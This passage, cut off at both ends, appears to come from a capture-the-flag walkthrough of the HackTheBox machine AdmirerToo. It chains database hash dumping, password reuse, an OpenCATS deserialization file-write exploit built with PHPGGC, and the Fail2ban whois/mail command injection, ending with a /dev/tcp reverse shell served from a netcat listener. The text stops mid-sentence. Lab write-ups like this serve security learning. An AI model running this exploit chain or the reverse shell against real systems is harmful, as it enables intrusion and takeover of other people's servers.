class="line">37</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo:/tmp$ mysql -u cats -p</span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; b SHOW DATABASES;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| cats_dev           |</span><br><span class="line">| information_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.002 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; USE cats_dev</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [cats_dev]&gt; SHOW TABLES;</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| Tables_in_cats_dev                   |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">| access_level                         |</span><br><span class="line">| [...]                                |</span><br><span class="line">| system                               |</span><br><span class="line">| tag                                  |</span><br><span class="line">| user                                 |</span><br><span class="line">| user_login                           |</span><br><span class="line">+--------------------------------------+</span><br><span class="line">55 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.002 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [cats_dev]&gt; SELECT user_id,user_name,password FROM user;</span><br><span class="line">+---------+----------------+----------------------------------+</span><br><span class="line">| user_id | user_name      | password                         |</span><br><span class="line">+---------+----------------+----------------------------------+</span><br><span class="line">|       1 | admin          | dfa2a420a4e48de6fe481c90e295fe97 |</span><br><span class="line">|    1250 | cats@rootadmin | cantlogin                        |</span><br><span class="line">|    1251 | jennifer       | f59f297aa82171cc860d76c390ce7f3e |</span><br><span class="line">+---------+----------------+----------------------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br></pre></td></tr></table></figure><p>We find a MD5 hash for <code>admin</code> user and <code>jennifer</code>. Unfortunately none of the hash can’t be found in MD5 reverse database. We are maybe on the wrong track for now. </p><h3 id="jennifer-password-re-use"><a href="#jennifer-password-re-use" class="headerlink" title="jennifer password re-use"></a>jennifer password re-use</h3><p>Going back to our enumeration we stumble upon the install folder of the Adminer application and find a commented out password:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">opentsdb@admirertoo$ cat /<span class="keyword">var</span>/www/adminer/plugins/data/servers.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">  <span class="string">&#x27;localhost&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="comment">//    &#x27;username&#x27; =&gt; &#x27;admirer&#x27;,</span></span><br><span class="line"><span class="comment">//    &#x27;pass&#x27;     =&gt; &#x27;bQ3u7^AxzcB7qAsxE3&#x27;,</span></span><br><span class="line"><span class="comment">// Read-only account for testing</span></span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;admirer_ro&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pass&#x27;</span>     =&gt; <span class="string">&#x27;1w4nn4b3adm1r3d2!&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;label&#x27;</span>    =&gt; <span class="string">&#x27;MySQL&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;databases&#x27;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&#x27;admirer&#x27;</span> =&gt; <span class="string">&#x27;Admirer DB&#x27;</span>,</span><br><span class="line">    )</span><br><span class="line">  ),</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>Since it’s important to check everything, let’s try to login to <code>jennifer</code> SSH using one of the passwords we found so far ? (<code>1w4nn4b3adm1r3d2!</code>, <code>adm1r3r0fc4ts</code>, <code>bQ3u7^AxzcB7qAsxE3</code>)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh jennifer@admirertoo.htb</span><br><span class="line">jennifer@admirertoo.htb<span class="string">&#x27;s password: bQ3u7^AxzcB7qAsxE3</span></span><br><span class="line"><span class="string">Linux admirertoo 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jennifer@admirertoo:~$ cat user.txt</span></span><br><span class="line"><span class="string">3706xxxxxxxxxxxxx7062</span></span><br></pre></td></tr></table></figure><p>I wasn’t expecting it to work, it’s a good reminder to stick to the basics even on “Hard” rated difficulty box :) </p><h2 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>So now that we are on <code>jennifer</code> account we can probably continue our recon on <code>opencats</code> application. First we can confirm it’s accessible from <code>jennifer</code> user:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ curl <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span></span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span></span><br><span class="line"><span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>opencats - Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><h3 id="Into-the-Opencats-rabbit-hole"><a href="#Into-the-Opencats-rabbit-hole" class="headerlink" title="Into the Opencats rabbit hole"></a>Into the Opencats rabbit hole</h3><p>Let’s port forward <code>opencats</code> to our machine to take a better look at it:</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -L <span class="number">9000</span>:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span> jennifer@admirertoo.htb</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/9076747/166157419-74b39d1a-00fb-44b1-87a6-16ca85fe01fa.png" alt="https://user-images.githubusercontent.com/9076747/166157419-74b39d1a-00fb-44b1-87a6-16ca85fe01fa.png"></p><p>We are presented with a login page telling us the version number (<code>0.9.5.2</code>). A quick Google search return an interesting vulnerability for this version: </p><blockquote><p><strong>OpenCATS PHP Object Injection to Arbitrary File Write (CVE-2021-25294)</strong><br>OpenCATS through 0.9.5-3 unsafely deserializes index.php?m=activity requests,<br>leading to remote code execution. This occurs because lib/DataGrid.php calls<br>unserialize for the parametersactivity:ActivityDataGrid parameter. The PHP object<br>injection exploit chain can leverage an __destruct magic method in guzzlehttp.<br><a href="https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html">https://snoopysecurity.github.io/web-application-security/2021/01/16/09_opencats_php_object_injection.html</a></p></blockquote><p>The blog post is very well explained and contains a PoC so let’s give a try.</p><p>First of all since we have write access to the database let’s just overwrite the <code>admin</code> password with our own to login to <code>opencats</code> admin panel:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> -n hg8 | md5sum</span><br><span class="line">70595983983f280d57999c58eda9f2a3  -</span><br><span class="line">$ mysql -u cats -p</span><br><span class="line">Enter password:</span><br><span class="line">MariaDB [(none)]&gt; use cats_dev;</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [cats_dev]&gt; update user <span class="built_in">set</span> password = <span class="string">&#x27;70595983983f280d57999c58eda9f2a3&#x27;</span> <span class="built_in">where</span> user_id=1;</span><br><span class="line">Query OK, 1 row affected (0.006 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br></pre></td></tr></table></figure><p>We can now connect:</p><p><img src="https://user-images.githubusercontent.com/9076747/166157962-5641a55a-f3f0-475a-9733-0ca5d2f9bda7.png" alt="https://user-images.githubusercontent.com/9076747/166157962-5641a55a-f3f0-475a-9733-0ca5d2f9bda7.png"></p><p>In order to exploit the vulnerability, as explained in the blog post, we need to go to the <code>activities</code> tab, select the <code>date</code> page and intercept the request in Burp:</p><p><img src="https://user-images.githubusercontent.com/9076747/166158220-76cdd510-dcc0-467b-a03d-2686c1f7932c.png" alt="https://user-images.githubusercontent.com/9076747/166158220-76cdd510-dcc0-467b-a03d-2686c1f7932c.png"></p><p>According to the vulnerability write-up, the <code>activity</code> parameter is vulnerable. So, we need to generate a serialized exploit using PHPGGC and replace the default one with it.</p><p>We have no information to know where to upload the PHP webshell nor which users permission will be applied. Let’s try to upload to the usual <code>/dev/shm</code> directory to check the file permission:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;test&quot;</span> &gt;&gt; hg8</span><br><span class="line">[hg8@archbook ~]$ ./phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/hg8 hg8</span><br><span class="line">a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A5%3A%22test%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A12%3A%22%2Fdev%2Fshm%2Fhg8%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D</span><br></pre></td></tr></table></figure><p>We can place our payload in the intercepted request: </p><p><img src="https://user-images.githubusercontent.com/9076747/166158784-88bca3af-6e56-44f2-8a91-a03e9f76ce56.png" alt="https://user-images.githubusercontent.com/9076747/166158784-88bca3af-6e56-44f2-8a91-a03e9f76ce56.png"></p><p>And it works, we can find our file under <code>/dev/shm</code> directory. As expected the file is not owned by <code>root</code> user but by <code>devel</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ ls -la /dev/shm</span><br><span class="line">-rw-r--r--  1 devel devel   48 May  1 19:03 hg8</span><br></pre></td></tr></table></figure><p>On top of that <code>devel</code> only have write permission to a few useless directory and don’t even have shell access:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ find / -group devel 2&gt;/dev/null</span><br><span class="line">/dev/shm/hg8</span><br><span class="line">/opt/opencats/INSTALL_BLOCK</span><br><span class="line">/usr/<span class="built_in">local</span>/src</span><br><span class="line">/usr/<span class="built_in">local</span>/etc</span><br><span class="line">jennifer@admirertoo:~$ cat /etc/passwd | grep devel</span><br><span class="line">devel:x:1003:1003::/home/devel:/sbin/nologin</span><br></pre></td></tr></table></figure><p>Bummer…. Looks like we are on a dead end here. </p><p>Let’s continue our search.</p><h3 id="Fail2ban-Remote-Code-Execution"><a href="#Fail2ban-Remote-Code-Execution" class="headerlink" title="Fail2ban Remote Code Execution"></a>Fail2ban Remote Code Execution</h3><p>During the recon process I noticed a <code>fail2ban</code> service running, but I didn’t pay that much attention since it’s a quite common service on boxes. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ ls -l /etc/init.d/*</span><br><span class="line">-rwxr-xr-x 1 root     root     8181 Aug  8  2020 /etc/init.d/apache2</span><br><span class="line">-rwxr-xr-x 1 root     root     2489 Aug  8  2020 /etc/init.d/apache-htcacheclean</span><br><span class="line">-rwxr-xr-x 1 root     root     3740 Mar 30  2019 /etc/init.d/apparmor</span><br><span class="line">-rwxr-xr-x 1 root     root     1232 Aug 15  2019 /etc/init.d/console-setup.sh</span><br><span class="line">-rwxr-xr-x 1 root     root     3059 Oct 11  2019 /etc/init.d/cron</span><br><span class="line">-rwxr-xr-x 1 root     root     2813 Jul  5  2020 /etc/init.d/dbus</span><br><span class="line">-rwxr-xr-x 1 root     root     7159 May 23  2020 /etc/init.d/exim4</span><br><span class="line">-rwxr-xr-x 1 root     root     6712 Sep 23  2018 /etc/init.d/fail2ban</span><br><span class="line">-rwxr-xr-x 1 root     root     3809 Jan 10  2019 /etc/init.d/hwclock.sh</span><br><span class="line">-rwxr-xr-x 1 root     root     1479 Oct 10  2016 /etc/init.d/keyboard-setup.sh</span><br><span class="line">-rwxr-xr-x 1 root     root     2044 Feb  9  2019 /etc/init.d/kmod</span><br><span class="line">-rwxr-xr-x 1 root     root     5930 May 10  2021 /etc/init.d/mysql</span><br><span class="line">-rwxr-xr-x 1 root     root     4445 Aug 25  2018 /etc/init.d/networking</span><br><span class="line">-rwxr-xr-x 1 opentsdb opentsdb 2863 Jul  9  2021 /etc/init.d/opentsdb</span><br><span class="line">-rwxr-xr-x 1 root     root     1846 Oct  9  2019 /etc/init.d/open-vm-tools</span><br><span class="line">-rwxr-xr-x 1 root     root     4793 Oct 24  2021 /etc/init.d/php7.3-fpm</span><br><span class="line">-rwxr-xr-x 1 root     root      924 May 31  2018 /etc/init.d/procps</span><br><span class="line">-rwxr-xr-x 1 root     root     4417 Mar 15  2019 /etc/init.d/rsync</span><br><span class="line">-rwxr-xr-x 1 root     root     2864 Feb 26  2019 /etc/init.d/rsyslog</span><br><span class="line">-rwxr-xr-x 1 root     root     3939 Jan 31  2020 /etc/init.d/ssh</span><br><span class="line">-rwxr-xr-x 1 root     root     6872 Jan 29  2021 /etc/init.d/udev</span><br><span class="line">-rwxr-xr-x 1 root     root     2757 Nov 23  2016 /etc/init.d/x11-common</span><br><span class="line"></span><br><span class="line">jennifer@admirertoo:~$ fail2ban-client --version</span><br><span class="line">Fail2Ban v0.10.2</span><br></pre></td></tr></table></figure><p>However when searching for the running version (<code>0.10.2</code>), we stumble upon an interesting vulnerability:</p><blockquote><p><strong>Possible RCE vulnerability in mailing action using mailutils (CVE-2021-32749)</strong><br>Command mail from mailutils package used in mail actions like mail-whois can execute command if unescaped sequences (\n~) are available in “foreign” input (for instance in whois output).<br><a href="https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm">https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm</a></p></blockquote><p><code>fail2ban</code> is tool used to analyse logs (or other data sources) in search of brute force traces in order to block such attempts based on the IP address. There are plenty of rules for different services (SSH, SMTP, HTTP, etc.). There are also defined actions which could be performed after blocking a client. One of these actions is sending an e-mail:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;test e-mail&quot;</span> | mail -s <span class="string">&quot;subject&quot;</span> user@example.org</span><br></pre></td></tr></table></figure><p>Looking at the config file on the box we confirm that <code>fail2ban</code> use <code>mail</code> as Mail Transfer Agent (mta) to notify when a brute-force attempt is detected:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ cat /etc/fail2ban/jail.local</span><br><span class="line">[DEFAULT]</span><br><span class="line">ignoreip = 127.0.0.1</span><br><span class="line">bantime = 60s</span><br><span class="line">destemail = root@admirertoo.htb</span><br><span class="line">sender = fail2ban@admirertoo.htb</span><br><span class="line">sendername = Fail2ban</span><br><span class="line">mta = mail</span><br><span class="line">action = %(action_mwl)s</span><br></pre></td></tr></table></figure><p>Digging into the config file we can find that only the <code>sshd</code> jail is activated:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ cat /etc/fail2ban/jail.d/defaults-debian.conf</span><br><span class="line">[sshd]</span><br><span class="line">enabled = <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>We have the possibility to trigger the jail by sending brute-force attempts on the SSH port. Once triggered the jail will send an email to <code>root@admirertoo.htb</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:/etc/fail2ban$ cat action.d/mail.conf</span><br><span class="line">[...]</span><br><span class="line">actionban = <span class="built_in">printf</span> %%b <span class="string">&quot;Hi,\n</span></span><br><span class="line"><span class="string">            The IP &lt;ip&gt; has just been banned by Fail2Ban after</span></span><br><span class="line"><span class="string">            &lt;failures&gt; attempts against &lt;name&gt;.\n\n</span></span><br><span class="line"><span class="string">            Here is more information about &lt;ip&gt; :\n</span></span><br><span class="line"><span class="string">            `%(_whois_command)s`\n</span></span><br><span class="line"><span class="string">            Regards,\n</span></span><br><span class="line"><span class="string">            Fail2Ban&quot;</span>|mail -s <span class="string">&quot;[Fail2Ban] &lt;name&gt;: banned &lt;ip&gt; from &lt;fq-hostname&gt;&quot;</span> &lt;dest&gt;</span><br></pre></td></tr></table></figure><p>According to the vulnerability writeup we need to control our whois server response to hold the malicious payload. </p><h3 id="Malicious-whois-server"><a href="#Malicious-whois-server" class="headerlink" title="Malicious whois server"></a>Malicious whois server</h3><p>First of all, we need to configure <code>whois</code> to connect to our own server. Unfortunately we don’t have permission to edit <code>/etc/hosts</code> to do so…</p><p>One alternative is taking advantage of the <code>whois.conf</code> config file to define the IP address of the Whois server to use.<br>Again we don’t have write permission to the <code>/etc/</code>  folder either. </p><p>That’s where the <code>opencats</code> arbitrary file will come useful since it gives us permission to write to <code>/usr/local/etc</code> (local equivalent to <code>/etc</code> for software).</p><p>Trying to do so we quickly stumble upon another blocker, the file we uploaded earlier using <code>opencats</code> vulnerability output the following format:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ cat /dev/shm/hg8</span><br><span class="line">[&#123;<span class="string">&quot;Expires&quot;</span>:1,<span class="string">&quot;Discard&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Value&quot;</span>:<span class="string">&quot;test\n&quot;</span>&#125;]</span><br></pre></td></tr></table></figure><p>Our actual <code>test</code> string is only a part of the file content created by <code>opencats</code>. </p><p>This is not going to work for our initial plan to create the <code>whois.conf</code> since <code>whois</code> expect the configuration file to be a server address or domain name list:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ man whois.conf</span><br><span class="line">[...]</span><br><span class="line">This file contains a list of WHOIS servers <span class="built_in">which</span> can augment or override the built-in list of the client.</span><br><span class="line">It<span class="string">&#x27;s a plain text file in ASCII encoding. Each line consists of two fields: a pattern to match WHOIS object identifier and a corresponding WHOIS server domain name.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Fields are separated by non-empty sequence of space or a tabular characters. A line starting with a hash character is a free comment and it&#x27;</span>s not considered.</span><br></pre></td></tr></table></figure><p>Just to make sure we can give a try on our local machine:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat /usr/<span class="built_in">local</span>/etc/whois.conf</span><br><span class="line">[&#123;<span class="string">&quot;Expires&quot;</span>:1,<span class="string">&quot;Discard&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Value&quot;</span>:<span class="string">&quot;10.10.14.67\n&quot;</span>&#125;]</span><br><span class="line">[hg8@archbook ~]$ whois example.org</span><br><span class="line">Cannot parse this line: [&#123;<span class="string">&quot;Expires&quot;</span>:1,<span class="string">&quot;Discard&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Value&quot;</span>:<span class="string">&quot;10.10.14.67\n&quot;</span>&#125;] </span><br></pre></td></tr></table></figure><p>We get a parsing error message as expected. However when checking the <a href="https://github.com/rfc1036/whois/blob/master/whois.c#L458">source code</a> of <code>whois</code> we can see that a regex is being applied to extract the server IP Address or Domain name. </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat /ect/whois.conf</span><br><span class="line"><span class="comment"># whois configuration file</span></span><br><span class="line">[..] </span><br><span class="line"><span class="comment"># Each entry is a single</span></span><br><span class="line"><span class="comment"># text line and consists of a regular expression pattern to match and</span></span><br><span class="line"><span class="comment"># the whois server to be used for it, separated by blank space.</span></span><br></pre></td></tr></table></figure><p>So if we include a proper regex escape maybe the config file can be parsed properly.</p><p>After digging in the madness of regex and several trial and errors we can come up with the following valid format:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;<span class="attr">&quot;Expires&quot;</span>:<span class="number">1</span>,<span class="attr">&quot;Discard&quot;</span>:<span class="literal">false</span>,<span class="attr">&quot;Value&quot;</span>:<span class="string">&quot;&#125;]|. [10.10.14.67]\n&quot;</span>&#125;]</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/9076747/166314333-56a95f13-e803-4e87-93db-06c44bdbc0c4.png" alt="https://user-images.githubusercontent.com/9076747/166314333-56a95f13-e803-4e87-93db-06c44bdbc0c4.png"></p><p>Once placed in the config, it is parsed correctly:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat /etc/whois.conf</span><br><span class="line">[&#123;<span class="string">&quot;Expires&quot;</span>:1,<span class="string">&quot;Discard&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Value&quot;</span>:<span class="string">&quot;&#125;]|. [10.10.14.67]\n&quot;</span>&#125;]</span><br><span class="line">[hg8@archbook ~]$ whois example.org</span><br><span class="line">connect: Connection refused</span><br></pre></td></tr></table></figure><p>We can now go back to the <code>opencats</code> vulnerability and send the following payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat whoisconf</span><br><span class="line">&#125;]|. [10.10.14.67]</span><br></pre></td></tr></table></figure><p>Let’s build it as we did earlier:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./phpggc -u --fast-destruct Guzzle/FW1 /usr/<span class="built_in">local</span>/etc/whois.conf whoisconf</span><br><span class="line">a%3A2%3A%7Bi%3A7%3BO%3A31%3A%22GuzzleHttp%5CCookie%5CFileCookieJar%22%3A4%3A%7Bs%3A36%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00cookies%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A27%3A%22GuzzleHttp%5CCookie%5CSetCookie%22%3A1%3A%7Bs%3A33%3A%22%00GuzzleHttp%5CCookie%5CSetCookie%00data%22%3Ba%3A3%3A%7Bs%3A7%3A%22Expires%22%3Bi%3A1%3Bs%3A7%3A%22Discard%22%3Bb%3A0%3Bs%3A5%3A%22Value%22%3Bs%3A19%3A%22%7D%5D%7C.+%5B10.10.14.67%5D%0A%22%3B%7D%7D%7Ds%3A39%3A%22%00GuzzleHttp%5CCookie%5CCookieJar%00strictMode%22%3BN%3Bs%3A41%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00filename%22%3Bs%3A25%3A%22%2Fusr%2Flocal%2Fetc%2Fwhois.conf%22%3Bs%3A52%3A%22%00GuzzleHttp%5CCookie%5CFileCookieJar%00storeSessionCookies%22%3Bb%3A1%3B%7Di%3A7%3Bi%3A7%3B%7D</span><br></pre></td></tr></table></figure><p>Then intercept and inject the payload with Burp. We can then verify it’s been upload properly using <code>jennifer</code> account:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ cat /usr/<span class="built_in">local</span>/etc/whois.conf</span><br><span class="line">[&#123;<span class="string">&quot;Expires&quot;</span>:1,<span class="string">&quot;Discard&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;Value&quot;</span>:<span class="string">&quot;&#125;]|. [10.10.14.67]\n&quot;</span>&#125;]</span><br></pre></td></tr></table></figure><p>Let’s open our reverse shell listener:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8585</span><br><span class="line">Listening on 0.0.0.0 8585</span><br></pre></td></tr></table></figure><p>Now we create our reverse shell and host it on a simple <code>whois</code> sever containing the reverse shell payload according to the <code>fail2ban</code> vulnerability write-up:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat hg8shell</span><br><span class="line">~| bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.67/8585 0&gt;&amp;1&quot;</span> &amp;</span><br><span class="line">$ sudo nc -nvlkp 43 -c <span class="string">&quot;cat hg8shell&quot;</span></span><br><span class="line">listening on [any] 43 ...</span><br></pre></td></tr></table></figure><p>We can verify from <code>jennifer</code> account that our <code>whois</code> server return the correct payload:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jennifer@admirertoo:~$ whois 10.10.14.67</span><br><span class="line">~| bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.67/8585 0&gt;&amp;1&quot;</span> &amp;</span><br></pre></td></tr></table></figure><p>Last step is to trigger <code>fail2ban</code> to send an email by attempting a brute-force on the SSH port:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh jennifer@10.129.96.181</span><br><span class="line">jennifer@10.129.96.181<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">jennifer@10.129.96.181&#x27;</span>s password: </span><br><span class="line">Permission denied, please try again.</span><br><span class="line">jennifer@10.129.96.181<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">jennifer@10.129.96.181: Permission denied (publickey,password).</span></span><br></pre></td></tr></table></figure><p>In order to get the attacker information, <code>fail2ban</code> will perform a <code>whois</code> on our IP, which will return the malicious payload to be executed by <code>fail2ban</code> as 